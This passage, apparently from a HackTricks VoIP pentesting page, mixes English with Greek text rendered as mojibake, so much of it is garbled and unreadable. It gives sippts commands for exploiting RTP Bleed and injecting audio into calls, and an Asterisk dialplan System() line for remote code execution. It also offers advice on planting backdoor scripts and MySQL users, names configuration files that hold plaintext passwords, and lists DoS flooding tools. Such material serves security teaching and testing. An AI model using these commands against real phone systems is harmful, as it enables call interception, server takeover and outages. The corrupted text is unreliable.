ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î¿Ï…Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…Ï‚ Î½Î± Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ ÏÎ¿Î­Ï‚ RTP Ï€Î¿Ï… Ï€ÏÎ¿Î¿ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ Î½Î± ÏƒÏ„Î±Î»Î¿ÏÎ½ ÏƒÎµ Î½ÏŒÎ¼Î¹Î¼Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚.

ÎœÎ¹Î± Î¬Î»Î»Î· ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Ï…ÏƒÎ± ÏƒÏ…Î¼Ï€ÎµÏÎ¹Ï†Î¿ÏÎ¬ Ï„Ï‰Î½ RTP proxies ÎºÎ±Î¹ Ï„Ï‰Î½ RTP stacks ÎµÎ¯Î½Î±Î¹ ÏŒÏ„Î¹ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ Ï†Î¿ÏÎ­Ï‚, **Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Î±Î½ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î¬Î»Ï‰Ï„Î± ÏƒÏ„Î¿ RTP Bleed**, Î¸Î± **Î±Ï€Î¿Î´Î­Ï‡Î¿Î½Ï„Î±Î¹, Ï€ÏÎ¿Ï‰Î¸Î¿ÏÎ½ ÎºÎ±Î¹/Î® ÎµÏ€ÎµÎ¾ÎµÏÎ³Î¬Î¶Î¿Î½Ï„Î±Î¹ RTP Ï€Î±ÎºÎ­Ï„Î± Î±Ï€ÏŒ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Ï€Î·Î³Î®**. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î¿Î¹ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Î¹ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÏƒÏ„ÎµÎ¯Î»Î¿Ï…Î½ RTP Ï€Î±ÎºÎ­Ï„Î± Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï„Î¿Ï…Ï‚ ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎ¿Ï…Î½ Î½Î± ÎµÎ¹ÏƒÎ¬Î³Î¿Ï…Î½ Ï„Î± Î¼Î­ÏƒÎ± Ï„Î¿Ï…Ï‚ Î±Î½Ï„Î¯ Î³Î¹Î± Ï„Î± Î½ÏŒÎ¼Î¹Î¼Î±. Î‘Ï…Ï„Î® Ï„Î·Î½ ÎµÏ€Î¯Î¸ÎµÏƒÎ· Ï„Î·Î½ Î¿Î½Î¿Î¼Î¬Î¶Î¿Ï…Î¼Îµ RTP injection ÎµÏ€ÎµÎ¹Î´Î® ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î® Ï€Î±ÏÎ¬Î½Î¿Î¼Ï‰Î½ RTP Ï€Î±ÎºÎ­Ï„Ï‰Î½ ÏƒÎµ Ï…Ï€Î¬ÏÏ‡Î¿Ï…ÏƒÎµÏ‚ ÏÎ¿Î­Ï‚ RTP. Î‘Ï…Ï„Î® Î· ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²ÏÎµÎ¸ÎµÎ¯ Ï„ÏŒÏƒÎ¿ ÏƒÎµ RTP proxies ÏŒÏƒÎ¿ ÎºÎ±Î¹ ÏƒÎµ endpoints.

ÎŸ Asterisk ÎºÎ±Î¹ Ï„Î¿ FreePBX Ï€Î±ÏÎ±Î´Î¿ÏƒÎ¹Î±ÎºÎ¬ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½ Ï„Î·Î½ **`NAT=yes` ÏÏÎ¸Î¼Î¹ÏƒÎ·**, Î· Î¿Ï€Î¿Î¯Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î¿ RTP traffic Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„ÎµÎ¹ Ï„Î·Î½ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·, ÎµÎ½Î´ÎµÏ‡Î¿Î¼Î­Î½Ï‰Ï‚ Î¿Î´Î·Î³ÏÎ½Ï„Î±Ï‚ ÏƒÎµ ÎºÎ±Î¼Î¯Î± Î® Î¼Î¿Î½ÏŒÎ´ÏÎ¿Î¼Î· Î®Ï‡Î¿ ÏƒÎµ ÎºÎ»Î®ÏƒÎµÎ¹Ï‚.

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎµÎ»Î­Î³Î¾Ï„Îµ [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`SIPPTS rtpbleed`** Î±Ï€ÏŒ [**sippts**](https://github.com/Pepelux/sippts)**:** Î¤Î¿ SIPPTS rtpbleed Î±Î½Î¹Ï‡Î½ÎµÏÎµÎ¹ Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± RTP Bleed ÏƒÏ„Î­Î»Î½Î¿Î½Ï„Î±Ï‚ ÏÎ¿Î­Ï‚ RTP.
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** Î±Ï€ÏŒ [**sippts**](https://github.com/Pepelux/sippts)**:** Î¤Î¿ SIPPTS rtcpbleed Î±Î½Î¹Ï‡Î½ÎµÏÎµÎ¹ Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± RTP Bleed ÏƒÏ„Î­Î»Î½Î¿Î½Ï„Î±Ï‚ ÏÎ¿Î­Ï‚ RTCP.
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** Î±Ï€ÏŒ [**sippts**](https://github.com/Pepelux/sippts)**:** Î¤Î¿ SIPPTS rtpbleedflood ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎµÏ„Î±Î¹ Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± RTP Bleed ÏƒÏ„Î­Î»Î½Î¿Î½Ï„Î±Ï‚ ÏÎ¿Î­Ï‚ RTP.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** Î±Ï€ÏŒ [**sippts**](https://github.com/Pepelux/sippts)**:** Î¤Î¿ SIPPTS rtpbleedinject ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎµÏ„Î±Î¹ Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± RTP Bleed ÎµÎ¹ÏƒÎ¬Î³Î¿Î½Ï„Î±Ï‚ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ Î®Ï‡Î¿Ï… (Î¼Î¿ÏÏ†Î® WAV).
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

Î£Ï„Î¿ Asterisk, Î¼Îµ ÎºÎ¬Ï€Î¿Î¹Î¿ Ï„ÏÏŒÏ€Î¿ ÎºÎ±Ï„Î±Ï†Î­ÏÎ½ÎµÏ„Îµ Î½Î± **Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ ÎºÎ±Î½ÏŒÎ½ÎµÏ‚ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÏÎ½ Î³ÏÎ±Î¼Î¼ÏÎ½ ÎºÎ±Î¹ Î½Î± Ï„Î¿Ï…Ï‚ ÎµÏ€Î±Î½Î±Ï†Î¿ÏÏ„ÏÏƒÎµÏ„Îµ** (Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Ï€Î±ÏÎ±Î²Î¹Î¬Î¶Î¿Î½Ï„Î±Ï‚ Î­Î½Î±Î½ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ·Ï‚ Î¹ÏƒÏ„Î¿Ï), ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ RCE Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ **`System`** ÎµÎ½Ï„Î¿Î»Î®.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
There is command called **`Shell`** that could be used **instead of `System`** to execute system commands if necessary.

{% hint style="warning" %}
If the server is **disallowing the use of certain characters** in the **`System`** command (like in Elastix), check if the web server allows to **create files somehow inside the system** (like in Elastix or trixbox), and use it to **create a backdoor script** and then use **`System`** to **execute** that **script**.
{% endhint %}

#### Interesting local files and permissions

* **`sip.conf`** -> Î ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï„Ï‰Î½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½ SIP.
* If the **Asterisk server is running as root**, you could compromise root
* **mysql root user** might **doesn't have any password**.
* this could be used to create a new mysql user as backdoor
* **`FreePBX`**
* **`amportal.conf`** -> Î ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï„Î¿Ï… Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î® Ï„Î¿Ï… web panel (FreePBX)
* **`FreePBX.conf`** -> Î ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· FreePBXuser Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½
* this could be used to create a new mysql user as backdoor
* **`Elastix`**
* **`Elastix.conf`** -> Î ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î±ÏÎºÎµÏ„Î¿ÏÏ‚ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÎµ ÎºÎ±Î¸Î±ÏÏŒ ÎºÎµÎ¯Î¼ÎµÎ½Î¿ ÏŒÏ€Ï‰Ï‚ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï„Î¿Ï… mysql root, Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ IMAPd, Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï„Î¿Ï… Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î® web
* **Several folders** will belong to the compromised asterisk user (if not running as root). This user can read the previous files and also controls the configuration, so he could make Asterisk to load other backdoored binaries when executed.

### RTP Injection

It's possible to insert a **`.wav`** in converstions using tools such as **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) and **`rtpmixsound`** (`sudo apt install rtpmixsound`).

Or you could use the scripts from [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) to **scan conversations** (**`rtpscan.pl`**), send a `.wav` to a conversation (**`rtpsend.pl`**) and **insert noise** in a conversation (**`rtpflood.pl`**).

### DoS

There are several ways to try to achieve DoS in VoIP servers.

* **`SIPPTS flood`** from [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS flood sends unlimited messages to the target.
* `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** from [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS ping makes a SIP ping to see the server response time.
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS IAX protocol used by Asterisk
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): A tool to perform SIP/SDP INVITE message flooding over UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Send several well formed RTP packets. Its needed to know the RTP ports that are being used (sniff first).
* [**SIPp**](https://github.com/SIPp/sipp): Allows to analyze and generate SIP traffic. so it can be used to DoS also.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP swiss army knife. Can also be used to perform SIP attacks.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### OS Vulnerabilities

The easiest way to install a software such as Asterisk is to download an **OS distribution** that has it already installed, such as: **FreePBX, Elastix, Trixbox**... The problem with those is that once it's working sysadmins might **not update them again** and **vulnerabilities** are going to be discovered with time.

## References

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
